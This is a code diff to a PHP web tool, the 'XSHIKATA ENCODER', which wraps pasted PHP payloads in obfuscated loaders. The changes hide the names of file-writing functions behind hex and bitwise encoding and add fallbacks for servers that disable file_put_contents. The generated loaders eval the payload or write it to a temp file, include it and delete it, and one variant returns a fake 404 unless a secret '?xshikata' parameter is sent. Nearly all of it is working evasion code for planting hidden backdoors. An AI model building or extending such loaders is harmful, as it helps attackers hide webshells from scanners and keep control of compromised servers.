@@ -1,10 +1,12 @@
 <?php
 /*
-    XSHIKATA ENCODER V8 (FINAL CLEAN)
+    XSHIKATA ENCODER V8.1 (MODIFIED)
     UI: Cyberpunk V1 (Responsive)
     Changes: 
     - No Comments in Output (1-14)
     - Method 14 Fixed Lock: ?xshikata
+    - Method 9 & 11: Function Names Hidden
+    - Method 9, 11, 12, 13, 14: Added 'file_put_contents' Fallback (fopen/fwrite)
 */
 
 $result = "";
@@ -35,7 +37,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             }
             $payload = implode('.', $encoded_array);
             $decoder = 'function xshikata($d){$k="xshikata";$p=explode(".",$d);$o="";$l=strlen($k);$i=0;foreach($p as $v){if($v==""||!is_numeric($v))continue;$o.=chr(($v/3)-ord($k[$i%$l]));$i++;}eval($o);}';
-            // Clean output without comments
             $result = '<?php' . "\n" . $decoder . "\n" . 'xshikata(\'' . $payload . '\');' . "\n" . '?>';
         }
 
@@ -162,13 +163,33 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         // ======================================================
-        // METHOD 9: GOTO STEALTH (NO EVAL)
+        // METHOD 9: GOTO STEALTH (NO EVAL + HIDDEN FUNC + FALLBACK)
         // ======================================================
         elseif ($method == 'goto_noeval') {
             $full_payload = "<?php\n" . $clean_code . "\n?>";
             $chunk_size = 10;
             $chunks = str_split($full_payload, $chunk_size);
             $var_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6); 
+            
+            // Random variable names for obfuscated functions
+            $v_sys = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_tmp = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_fpc = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_unl = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_fop = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_fwr = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_fcl = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
+            $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
+            $v_hand = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+
+            $hex_sys = bin2hex('sys_get_temp_dir');
+            $hex_tmp = bin2hex('tempnam');
+            $hex_fpc = bin2hex('file_put_contents');
+            $hex_unl = bin2hex('unlink');
+            $hex_fop = bin2hex('fopen');
+            $hex_fwr = bin2hex('fwrite');
+            $hex_fcl = bin2hex('fclose');
+
             $labels = [];
             for($i=0; $i<=count($chunks); $i++) { $labels[] = 'L' . mt_rand(1000,9999) . strtoupper(uniqid()); }
             $blocks = [];
@@ -182,9 +203,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             shuffle($blocks);
             $start_label = $labels[0];
             $end_label = end($labels);
-            $header = "$var_name=''; goto $start_label;";
+            
+            // Setup obfuscated variables
+            $setup = "$v_sys=hex2bin('$hex_sys');$v_tmp=hex2bin('$hex_tmp');$v_fpc=hex2bin('$hex_fpc');$v_unl=hex2bin('$hex_unl');$v_fop=hex2bin('$hex_fop');$v_fwr=hex2bin('$hex_fwr');$v_fcl=hex2bin('$hex_fcl');";
+            
+            $header = "$setup $var_name=''; goto $start_label;";
             $body = implode("\n", $blocks);
-            $footer = "$end_label: \$t=tempnam(sys_get_temp_dir(),'x'); file_put_contents(\$t,$var_name); include(\$t); unlink(\$t);";
+            
+            // Footer with fallback logic
+            $footer_logic = "
+                $v_path = $v_tmp($v_sys(), 'x');
+                if(function_exists($v_fpc)){
+                    $v_fpc($v_path, $var_name);
+                } else {
+                    $v_hand = $v_fop($v_path, 'w');
+                    $v_fwr($v_hand, $var_name);
+                    $v_fcl($v_hand);
+                }
+                include($v_path);
+                $v_unl($v_path);
+            ";
+            $footer = "$end_label: " . trim(preg_replace('/\s+/', ' ', $footer_logic));
+            
             $result = "<?php\nerror_reporting(0);\n$header\n$body\n$footer\n?>";
         }
 
@@ -192,6 +232,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         // METHOD 10: GOTO NATIVE
         // ======================================================
         elseif ($method == 'goto_native') {
+            // Note: Method 10 does not use file writing (no file_put_contents), so no fallback needed.
             $tokens = token_get_all("<?php " . $clean_code);
             $obfuscated_code = '';
             foreach ($tokens as $token) {
@@ -218,20 +259,57 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         // ======================================================
-        // METHOD 11: OOP DESTRUCTOR (FIXED)
+        // METHOD 11: OOP DESTRUCTOR (HIDDEN FUNC + FALLBACK)
         // ======================================================
         elseif ($method == 'oop') {
             $var_name = "X" . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $prop_name = "_" . substr(md5(time()), 0, 4);
             $payload_ready = "<?php " . $clean_code . " ?>";
             $hex_payload = bin2hex($payload_ready);
-            $class_code = "class $var_name { private $$prop_name = '$hex_payload'; public function __destruct() { \$c = hex2bin(\$this->$prop_name); \$t = tempnam(sys_get_temp_dir(), 'pk'); if(file_put_contents(\$t, \$c)) { include(\$t); unlink(\$t); } } } new $var_name();";
+            
+            // Hex encoded function names
+            $hex_sys = bin2hex('sys_get_temp_dir');
+            $hex_tmp = bin2hex('tempnam');
+            $hex_fpc = bin2hex('file_put_contents');
+            $hex_unl = bin2hex('unlink');
+            $hex_fop = bin2hex('fopen');
+            $hex_fwr = bin2hex('fwrite');
+            $hex_fcl = bin2hex('fclose');
+
+            $class_code = "
+            class $var_name { 
+                private $$prop_name = '$hex_payload'; 
+                public function __destruct() { 
+                    \$c = hex2bin(\$this->$prop_name); 
+                    \$sy = hex2bin('$hex_sys');
+                    \$tm = hex2bin('$hex_tmp');
+                    \$fp = hex2bin('$hex_fpc');
+                    \$un = hex2bin('$hex_unl');
+                    \$t = \$tm(\$sy(), 'pk'); 
+                    
+                    if(function_exists(\$fp)) {
+                        \$fp(\$t, \$c);
+                    } else {
+                        \$fo = hex2bin('$hex_fop');
+                        \$fw = hex2bin('$hex_fwr');
+                        \$fc = hex2bin('$hex_fcl');
+                        \$h = \$fo(\$t, 'w');
+                        \$fw(\$h, \$c);
+                        \$fc(\$h);
+                    }
+                    
+                    include(\$t); 
+                    \$un(\$t); 
+                } 
+            } 
+            new $var_name();";
+            
             $class_code = trim(preg_replace('/\s+/', ' ', $class_code));
             $result = "<?php\n$class_code\n?>";
         }
 
         // ======================================================
-        // METHOD 12: DYNAMIC FUNCTION MAPPING
+        // METHOD 12: DYNAMIC FUNCTION MAPPING (WITH FALLBACK)
         // ======================================================
         elseif ($method == 'dynamic_call') {
             $payload_ready = "<?php " . $clean_code . " ?>";
@@ -240,21 +318,50 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5);
             $v_func_write = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
             $v_func_unlk = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
+            $v_func_fopen = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
+            $v_func_fwrite = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
+            $v_func_fclose = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 6);
+            
             $hex_fpc = bin2hex('file_put_contents');
             $hex_unl = bin2hex('unlink');
-            $final_logic = "$v_payload=hex2bin('$hex_payload');$v_func_write=hex2bin('$hex_fpc');$v_func_unlk=hex2bin('$hex_unl');$v_path=tempnam(sys_get_temp_dir(),'gc');$v_func_write($v_path,$v_payload);include($v_path);$v_func_unlk($v_path);";
+            $hex_fop = bin2hex('fopen');
+            $hex_fwr = bin2hex('fwrite');
+            $hex_fcl = bin2hex('fclose');
+            
+            $final_logic = "
+            $v_payload=hex2bin('$hex_payload');
+            $v_func_write=hex2bin('$hex_fpc');
+            $v_func_unlk=hex2bin('$hex_unl');
+            $v_path=tempnam(sys_get_temp_dir(),'gc');
+            
+            if(function_exists($v_func_write)) {
+                $v_func_write($v_path,$v_payload);
+            } else {
+                $v_func_fopen=hex2bin('$hex_fop');
+                $v_func_fwrite=hex2bin('$hex_fwr');
+                $v_func_fclose=hex2bin('$hex_fcl');
+                \$h = $v_func_fopen($v_path, 'w');
+                $v_func_fwrite(\$h, $v_payload);
+                $v_func_fclose(\$h);
+            }
+            
+            include($v_path);
+            $v_func_unlk($v_path);";
+            
+            $final_logic = trim(preg_replace('/\s+/', '', $final_logic));
             $result = "<?php\n$final_logic\n?>";
         }
 
         // ======================================================
-        // METHOD 13: BITWISE INVERSION (NO-FUNC DECODE)
+        // METHOD 13: BITWISE INVERSION (NO-FUNC DECODE + FALLBACK)
         // ======================================================
         elseif ($method == 'bitwise') {
-            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir'];
+            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir', 'fopen', 'fwrite', 'fclose'];
             $vars = [];
             foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
             $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $v_payload = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+            $v_handle = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $payload_ready = "<?php " . $clean_code . " ?>";
             $encoded_payload = ~$payload_ready;
             
@@ -268,6 +375,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $str_unl = safe_escape(~$funcs[1]);
             $str_tmp = safe_escape(~$funcs[2]);
             $str_sys = safe_escape(~$funcs[3]);
+            $str_fop = safe_escape(~$funcs[4]);
+            $str_fwr = safe_escape(~$funcs[5]);
+            $str_fcl = safe_escape(~$funcs[6]);
             $str_pay = safe_escape($encoded_payload);
             
             $logic = "
@@ -275,10 +385,21 @@ $vars[file_put_contents] = ~\"$str_fpc\";
 $vars[unlink] = ~\"$str_unl\";
 $vars[tempnam] = ~\"$str_tmp\";
 $vars[sys_get_temp_dir] = ~\"$str_sys\";
+$vars[fopen] = ~\"$str_fop\";
+$vars[fwrite] = ~\"$str_fwr\";
+$vars[fclose] = ~\"$str_fcl\";
 $v_payload = ~\"$str_pay\";
 
 $v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(), 'bw');
-{$vars['file_put_contents']}($v_path, $v_payload);
+
+if(function_exists({$vars['file_put_contents']})) {
+    {$vars['file_put_contents']}($v_path, $v_payload);
+} else {
+    $v_handle = {$vars['fopen']}($v_path, 'w');
+    {$vars['fwrite']}($v_handle, $v_payload);
+    {$vars['fclose']}($v_handle);
+}
+
 include($v_path);
 {$vars['unlink']}($v_path);
 ";
@@ -288,7 +409,7 @@ include($v_path);
         }
 
         // ======================================================
-        // METHOD 14: HYBRID STEALTH (BITWISE + XOR + LOCK: xshikata)
+        // METHOD 14: HYBRID STEALTH (BITWISE + XOR + LOCK + FALLBACK)
         // ======================================================
         elseif ($method == 'hybrid') {
             // 1. Setup Keys
@@ -304,12 +425,13 @@ include($v_path);
             $encoded_payload = ~$xored;
 
             // 3. Prepare Dynamic Vars
-            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir'];
+            $funcs = ['file_put_contents', 'unlink', 'tempnam', 'sys_get_temp_dir', 'fopen', 'fwrite', 'fclose'];
             $vars = [];
             foreach($funcs as $f) { $vars[$f] = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 5); }
             $v_path = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $v_pay  = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             $v_lock_name = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
+            $v_hand = '$' . substr(str_shuffle('abcdefghijklmnopqrstuvwxyz'), 0, 4);
             
             if (!function_exists('safe_escape')) {
                 function safe_escape($str) {
@@ -321,7 +443,10 @@ include($v_path);
             $str_unl = safe_escape(~$funcs[1]);
             $str_tmp = safe_escape(~$funcs[2]);
             $str_sys = safe_escape(~$funcs[3]);
-            $str_lck = safe_escape(~$lock_param); // Encoded lock param name (xshikata)
+            $str_fop = safe_escape(~$funcs[4]);
+            $str_fwr = safe_escape(~$funcs[5]);
+            $str_fcl = safe_escape(~$funcs[6]);
+            $str_lck = safe_escape(~$lock_param);
             $str_pay = safe_escape($encoded_payload);
 
             // 4. Construct Decoder (FIXED SYNTAX)
@@ -330,18 +455,29 @@ include($v_path);
 {$vars['unlink']} = ~\"$str_unl\";
 {$vars['tempnam']} = ~\"$str_tmp\";
 {$vars['sys_get_temp_dir']} = ~\"$str_sys\";
+{$vars['fopen']} = ~\"$str_fop\";
+{$vars['fwrite']} = ~\"$str_fwr\";
+{$vars['fclose']} = ~\"$str_fcl\";
+
 $v_lock_name = ~\"$str_lck\";
 if(!isset(\$_GET[$v_lock_name])){header('HTTP/1.0 404 Not Found');die();}
 $v_pay = ~\"$str_pay\";
 for(\$i=0;\$i<strlen($v_pay);\$i++){\$j=\$i%8;{$v_pay}[\$i]={$v_pay}[\$i]^\"$xor_key\"[\$j];}
 $v_path = {$vars['tempnam']}({$vars['sys_get_temp_dir']}(),'hb');
-{$vars['file_put_contents']}($v_path, $v_pay);
+
+if(function_exists({$vars['file_put_contents']})){
+    {$vars['file_put_contents']}($v_path, $v_pay);
+} else {
+    $v_hand = {$vars['fopen']}($v_path, 'w');
+    {$vars['fwrite']}($v_hand, $v_pay);
+    {$vars['fclose']}($v_hand);
+}
+
 include($v_path);
 {$vars['unlink']}($v_path);
 ";
             $logic = trim(preg_replace('/\s+/', ' ', $logic)); 
             
-            // Khusus method 14, ada tampilan pesan usage
             $result = "<?php\n/* Usage: ?xshikata */\n$logic\n?>";
         }
     }
@@ -353,7 +489,7 @@ include($v_path);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XSHIKATA V8 FINAL</title>
+    <title>XSHIKATA V8.1 FINAL</title>
     <style>
         :root {
             --bg: #0d1117;
@@ -465,8 +601,8 @@ include($v_path);
 
 <div class="container">
     <div class="header">
-        <h1>[ XSHIKATA ENCODER V8 ]</h1>
-        <p style="color:#8b949e; font-size:12px; margin-top:5px;">CLEAN & RESPONSIVE</p>
+        <h1>[ XSHIKATA ENCODER V8.1 ]</h1>
+        <p style="color:#8b949e; font-size:12px; margin-top:5px;">HIDDEN FUNCTIONS & FALLBACK ADDED</p>
     </div>
 
     <div class="box">
@@ -488,11 +624,11 @@ include($v_path);
                     <option value="emoji">METHOD 6: Emoji Crypt (Visual)</option>
                     <option value="switch">METHOD 7: Switch-Case Machine (No Base64)</option>
                     <option value="goto">METHOD 8: Goto Stealth (With Eval)</option>
-                    <option value="goto_noeval">METHOD 9: Goto Stealth (No Eval)</option>
+                    <option value="goto_noeval">METHOD 9: Goto Stealth (No Eval + Hidden + Fallback)</option>
                     <option value="goto_native">METHOD 10: Goto Native (Mixed Strings)</option>
-                    <option value="oop">METHOD 11: OOP Destructor (Ghost Class)</option>
-                    <option value="dynamic_call">METHOD 12: Dynamic Function Mapping (Ghost Call)</option>
-                    <option value="bitwise">METHOD 13: Bitwise Inversion (No-Func Decode)</option>
+                    <option value="oop">METHOD 11: OOP Destructor (Ghost Class + Fallback)</option>
+                    <option value="dynamic_call">METHOD 12: Dynamic Function Mapping (Fallback)</option>
+                    <option value="bitwise">METHOD 13: Bitwise Inversion (Fallback)</option>
                     <option value="hybrid" style="color:red; font-weight:bold;">METHOD 14: Hybrid Stealth (Lock: ?xshikata)</option>
                 </select>
                 <button type="submit" class="btn-main">ENCODE PAYLOAD</button>
@@ -517,7 +653,7 @@ include($v_path);
     <?php endif; ?>
     
     <div style="text-align:center; margin-top:30px; color:#30363d; font-size:11px;">
-        XSHIKATA V8 | CLEAN EDITION
+        XSHIKATA V8.1 | MODIFIED EDITION
     </div>
 </div>
 
